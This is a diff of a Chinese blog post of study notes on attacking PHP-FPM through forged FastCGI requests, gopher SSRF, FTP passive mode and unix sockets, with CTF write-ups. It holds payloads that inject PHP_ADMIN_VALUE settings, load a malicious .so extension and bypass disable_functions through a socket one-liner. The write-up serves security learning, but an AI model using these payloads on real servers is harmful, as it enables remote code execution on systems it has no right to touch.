@@ -1,8 +1,8 @@
 ---
 title: "攻击PHP-FPM学习笔记"
 slug: "attack-php-fpm-study-notes"
-description: "如果你能看到这行字，说明这篇笔记还是个半成品2333333"
-date: 2021-11-15T01:58:35+08:00
+description: "差蓝帽杯那个没复现，云了，就是摆"
+date: 2021-11-18T00:03:25+08:00
 categories: ["NOTES&SUMMARY"]
 series: []
 tags: ["PHP", "php-fpm"]
@@ -12,7 +12,7 @@ toc: true
 
 之前做题总是会见到，但并不是很懂实际的原理，有点云里雾里的，好像懂了但又没有完全懂，是时候专门来学一下咯！
 
-没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合&重新整理，不过自己亲自过一遍手懂了很多东西，参考链接放到最后啦w
+没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合&重新整理，参考链接放到最后啦w
 
 ## 前置知识
 
@@ -23,6 +23,14 @@ CGI协议用于处理html这类静态文件之后出现的动态语言的解释�
 CGI的弊端是令webserver每次处理请求时都会fork一个cgi进程，结束后再kill，比较浪费资源，FastCGI协议就解决了这个问题，处理完请求后不会kill而是保留该进程，使它可以一次处理多个请求，这样就不用每次fork了
 
 而php-fpm就是FastCGI协议的一个具体实现，作为FastCGI进程管理器（运行时有一个主进程和多个包含php解释器的worker进程来执行代码），用于接收webserver的请求
+
+查看phpinfo，Sever API处一般会有三种样式：
+
+- Apache 2.0 Handler
+- CGI/FastCGI
+- FPM/FastCGI
+
+第一种把php作为apache的一个模块，相当于apache中的一个.dll或.so；第二种php-cgi.exe是一个独立的进程，web服务器也是独立的apache.exe，web服务器监听到http请求时会去调用php-cgi进程，之间通过cgi协议传递数据；而第三种fastcgi也是一种协议，它做了很多优化且常驻内存 不用每次都调用一下cgi，有辅助功能比如内存管理，垃圾处理由php-fpm来实现
 
 ### 配置
 
@@ -56,13 +64,30 @@ server{
 }
 ```
 
-#### ***unix socket模式
+#### unix socket模式
 
+如果启动fpm不做改动，默认为套接字模式
 
+/etc/php/7.4/fpm/pool.d/www.conf
 
+```ini
+listen = /run/php/php7.4-fpm.sock
+```
 
+/etc/nginx/sites-enabled/default
 
+```ini
+server{
+	...
+	location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/run/php/php7.4-fpm.sock;
+	}
+...
+}
+```
 
+然后重启即可
 
 ```bash
 service nginx start	# reload
@@ -104,9 +129,9 @@ header中的type起到指定record的作用，因为FastCGI的单个record大小
 
 ![image-20211112110643128](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png)
 
-当type=4时，表明消息中包含的数据为某个name-value对，比如（虽然但是，我也不知道这个主题下json渲染出来的颜色这么阴间）
+当type=4时，表明消息中包含的数据为某个name-value对，比如
 
-```json
+```
 {
     'GATEWAY_INTERFACE': 'FastCGI/1.0',
     'REQUEST_METHOD': 'GET',
@@ -132,9 +157,9 @@ header中的type起到指定record的作用，因为FastCGI的单个record大小
 'PHP_ADMIN_VALUE': 'allow_url_include = On'
 ```
 
-来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定了，无法重写）
+来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定好了，无法重写）
 
-## 攻击思路
+## 攻击思路&&例题
 
 伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload，再发出去
 
@@ -164,11 +189,67 @@ python fpm.py target_ip _ -c '<?php echo `id`;exit;?>'
 
 ![image-20211112175353957](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png)
 
-### ***SSRF攻击本地php-fpm
+### SSRF攻击本地php-fpm
 
-利用`gopher://`协议可以直接传输TCP协议流，我们构造好payload之后urlencode就可以传入进行ssrf攻击了
+利用`gopher://`协议可以直接传输TCP协议流，我们构造好payload之后就可以传入进行ssrf攻击了
 
+构造payload依旧使用p牛的脚本，不过做一点微小的改动；这部分可以参见后面结合ftp攻击fpm的内容，总之就照这几步走
 
+- p牛脚本生成urlencode之后的tcp数据流
+- 加gopher://127.0.0.1:9000前缀
+- 梭！?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx
+
+#### [强网青少 2021]SSRF
+
+```php
+<?php
+highlight_file(__FILE__);
+//like fpm?
+class Crawl{
+    public $url;
+    function __construct($url){
+        if(substr($url,0,7)==="http://"){
+            $this->url = $url;
+        }else{
+            $this->url = "http://127.0.0.1/";
+        }
+    }
+    public function curl($url){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $result=curl_exec($ch);
+        curl_close($ch);
+        echo $result;
+    }
+    function __destruct(){
+        $this->curl($this->url);
+    }
+}
+if($_COOKIE["login"]=='1'){
+    unserialize($_COOKIE["crawldata"]);
+}else{
+    if(isset($_GET["url"])){
+        $crl = new Crawl($_GET["url"]);
+    }else{
+        echo "no";
+    }
+}
+?>
+```
+
+用p牛脚本生成payload，直接ssrf伪协议好像也行？没环境，云一下了
+
+```php
+$a = new Crawl();
+$a -> url = "gopher://127.0.0.1:9001/_xxxxxxxx";
+// $a -> url = "dict://127.0.0.1:80/info";
+// $a -> url = "file:///proc/net/arp";
+echo urlencode(serialize($a));
+```
+
+将序列化之后的结果传入crawldata
 
 ### 结合ftp&PASV mode攻击本地php-fpm
 
@@ -357,13 +438,9 @@ print("[+] completed ~~")
 - 用file_put_contents('/tmp/wuhu.so',$_POST['data'])的形式将.so传入
 - 如果顺利的话open_basedir解开限制，.so被包含，就可以成功执行.so中的代码做到rce了
 
-这里的完美栗子就是赵总的三句话（指路赵总博客->[WMCTF2021-Web-Make PHP Great Again And Again WriteUp](https://www.zhaoj.in/read-6951.html)
+这里的完美栗子当然是赵总的三句话（指路赵总博客->[WMCTF2021-Web-Make PHP Great Again And Again WriteUp](https://www.zhaoj.in/read-6951.html)
 
-### ***攻击unix socket模式下的php-fpm
-
-## 在题目中的表现
-
-### [WMCTF 2021]Make PHP Great Again And Again
+#### [WMCTF 2021]Make PHP Great Again And Again
 
 思路先放在前面：找到fpm端口->搭建恶意ftp_server 将.so文件转发至fpm端口->利用.so文件执行命令->拿flag
 
@@ -476,7 +553,7 @@ if (!$socket) {
 
 urlencode之后传入，再扫一下端口可以看到46819开放，说明服务正常；还是用之前p牛的脚本构造，这里我们要修改的配置项是这些
 
-```json
+```
 'PHP_ADMIN_VALUE': 'allow_url_include = On\nopen_basedir = /\nextension = /tmp/wuhu.so',
 ```
 
@@ -540,26 +617,91 @@ a=var_dump(file_put_contents('/tmp/wuhu.so',$_POST['data']));&data=xxxxxxxxxxxxx
 
 不想再耗太多时间在这个题上了，实在是绷不住了（调了快1天了），基本也算是打通了（毕竟就差一点点啊啊啊啊啊 我截图还有呢）（其实是懒的重置docker再尝试了 我的），我猜测出错的点在于那个开在46819端口的ftp服务器不稳定，它在处理这边ftp打出的流量时可能没有正常的处理，再加上来回调整payload打了太多次了，可能之前的错误累积到后面，比如某次没有urlencode之类的，搞得环境也不正常了
 
-### ***[蓝帽杯 2021]One Pointer PHP
+#### ***[蓝帽杯 2021]One Pointer PHP
 
 ------
 
-现在是凌晨1点50分，赵总的题没能成功打出来真的很难受，很难受，很难受，我人裂开，说好的今天必定搞完，但是现在还差3个小标题和2个题没有复现
+yysy，确实没时间复现（复现赵总的题让我有心理阴影了）
 
-先把半成品放上来吧，这周内必定收尾！
+我就先云一下，对8起
+
+参考：[wp1](http://www.yang99.top/index.php/archives/52/)  |  [wp2](https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/
+)
+
+### 攻击unix socket模式下的php-fpm
+
+由于unix socket是读取/run/php/php7.4-fpm.sock进行内部通信，那必然是不能打远程，用的是`stream_socket_client`建立一个unix socket连接，然后写入tcp流来通信
+
+```php
+<?php $sock=stream_socket_client('unix:///run/php/php7.3-fpm.sock');fputs($sock,base64_decode($_POST['A']));var_dump(fread($sock, 4096));?>
+```
+
+#### [*CTF 2019]Echohub
+
+前面的pwn部分我是不太能看懂（至少目前），就简单说说后面的web部分；[这里是参考wp](https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Echohub)
+
+从phpinfo可以看到disable_functions
+
+```
+file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv
+```
+
+考虑用`create_function`来rce，不过还是绕不过disable_functions来执行/readflag
+
+不过跑一下给出的docker，可以看到用unix socket模式运行的php-fpm
+
+题目环境安装了apache服务器和apache-module模式的php模块（这个就是题目环境），但是fpm也安装了并且启动
+
+fpm模式的php.ini与phpinfo中显示的不同，是独立的，disable_funtcions的限制宽松很多，我们来打它来rce，exp就是上面那个
 
 ------
+
+拖拖拉拉四五天，总算是抽空给总结完了，对做题和学习方面又有了一些船新的理解，还是有很多收获的
 
 {{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（" %}}
 
-[fastcgi协议分析与实例](https://blog.csdn.net/shreck66/article/details/50355729)
+[fastcgi协议分析与实例](https://blog.csdn.net/shreck66/article/details/50355729)  |  [php-fpm 与 Nginx优化总结](https://www.kancloud.cn/digest/php-src/136260)
 
-[php-fpm 与 Nginx优化总结](https://www.kancloud.cn/digest/php-src/136260)
+[PHP 连接方式 & PHP-FPM未授权访问漏洞 & *CTF echohub](https://evoa.me/archives/6/)
 
 [浅析php-fpm的攻击方式](https://xz.aliyun.com/t/5598)
 
 [Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)
 
 [【技术分享】深入 FTP 攻击 php-fpm 绕过 disable_functions](https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA)
+
+{{% /spoiler %}}
+
+------
+
+{{% spoiler "一点对近况的碎碎念" %}}
+
+最近有点自闭，看着那么多和我学习时间差不多的师傅都已经相当相当厉害了，我还是跟刚开始一样菜，满打满算学了也半年多了，怎么就这么菜呢？？？？？？？差距太大了，他妈的就是菜啊
+
+看看别人博客都写得啥，cve复现，漏洞挖掘，渗透实战，安全研究，我呢？全是互联网湿垃圾，没一点含金量，就会写一点wp，还大多都是参考了别人的内容，然后写一点知识总结，跟个小学生一样
+
+这周下了决心把没用的课的假请掉了，希望自己能好好利用起来，别摆了，真别摆了，要出大问题
+
+不过总结是很有必要的，现在的进度是这样：
+
+- php反序列化：缺 原生类的学习+跟一些实际的链子
+- python反序列化：完
+- sqli：差不多完，还得多做点题加深理解
+- SSTI：完
+- 文件上传：之前9月总结到一半去打hvv了
+- php-fpm：完
+- GraphQL：完
+
+很薄弱的地方都还没掌握（这不是废话），几个急需总结掌握的：
+
+- ssrf：不熟练
+- xss：做题遇到都是躲着走
+- js圆形污染：跟上面那个总是一起出现
+- xxe
+- xsleaks
+
+还有java，这个必须得学
+
+不多说了，冲！！！
 
 {{% /spoiler %}}
